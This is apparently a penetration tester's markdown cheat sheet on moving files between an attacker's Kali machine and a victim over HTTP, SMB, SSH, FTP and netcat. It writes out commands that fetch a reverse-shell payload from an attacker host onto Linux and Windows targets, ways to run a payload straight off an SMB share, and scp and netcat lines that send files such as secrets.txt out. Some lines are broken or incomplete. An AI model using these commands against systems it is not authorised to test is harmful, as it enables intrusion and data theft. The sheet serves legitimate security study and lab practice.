

# Transfering files
## HTTP

### Method 1

#### Sender

`python3 -m http.server 8000`
`python -m SimpleHTTPServer`

#### Receiver
##### Linux
`wget http://10.10.10.79:8000/rev_shell.sh -O /tmp/rev_shell.sh`
(<file> can be just the file name to save to current location, or a full path)
`curl http://10.10.10.79:8000/rev_shell.sh -o /tmp/rev_shell.sh`

##### Windows
`curl http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
(we need to mention the -o (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., WebResponseObject.)
`certutil -urlcache -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
`certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
(The -split option in certutil is used to split large files into smaller segments to perform the file transfer.)
`bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe`
(Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files. <br> The C:\Users\Public\ directory is accessible to all users on a Windows system)
`powershell wget http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
`powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.79:8000/rev_shell.exe', 'rev_shell.exe')`
instantly execute it:
``

### Method 2

#### Sender

`curl -T rev_shell.exe http://10.10.10.79:8000`

#### Receiver

python3 -m SimpleHTTPPutServer 8080

[SimpleHTTPPutServer.py](https://gist.github.com/fabiand/5628006)

```
# python3 -m SimpleHTTPPutServer 8080

from http.server import HTTPServer, SimpleHTTPRequestHandler

class PutHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        print(self.headers)
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()


def run(server_class=HTTPServer, handler_class=PutHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```




## FTP
Kali -> Victim

| Kali    | Linux Victim | Windows Victim cmd.exe |
| -------- | ------- |
| python3 -m http.server 8080  | wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>) | ...|
| python3 -m pytfplib -w -p <Port_number>

## SMB

#### Sender
`impacket-smbserver share .`
`impacket-smbserver share $(pwd) -smb2support`
( Here we are giving the shared directory name as share, the significance of the share here is that it converts the file’s long path into a single share directory. Here we can give the full path of directory or the pwd as argument so that it takes the current directories path.)

#### Receiver

```
smbclient -L 192.168.31.141
smbclient "\\\\192.168.31.141\share"
ls
get ignite.txt
put data.txt
```

`impacket-smbclient`

`copy ignite.txt \\192.168.31.141\share\ignite.txt`

to instantly execute it: `powershell -c (\\<kali_IP\<server_name>\<payload)`

or just copy: `copy \\192.168.31.141\share\ignite.txt`

Kali -> Victim

| Kali    | Windows Victim PowerShell |
| -------- | ------- |
| impacket-smbserver <server_name> .  | to instantly execute it: powershell -c (\\<kali_IP\<server_name>\<payload) |

impacket-smbserver <server_name> .

## SSH

### Sender

`scp secrets.txt kali@10.10.10.79:/path/to/dir`
`scp rev_shell.exe raj@192.168.31.219:/C:/Users/Public`

### Receiver



scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir

| Sending    | Receiving |
| ------- | ------- |
| scp <file_name> <remote_username>@<remote_IP>:/path/to/dir | scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir |

## NetCat

| Sending | Receiving |
| -------- | ------- |
| nc -w 3 [destination] <Port_number> < <file_name> | nc -l -p <Port_number> > <file_name> |
| | nc -lvnp <Port_number> |



Useful notes:
- on Linux receiving: worth using /tmp directory, as it is globally readable, writeable and executable
- upgrade your shell, if possible
- try multiple methods
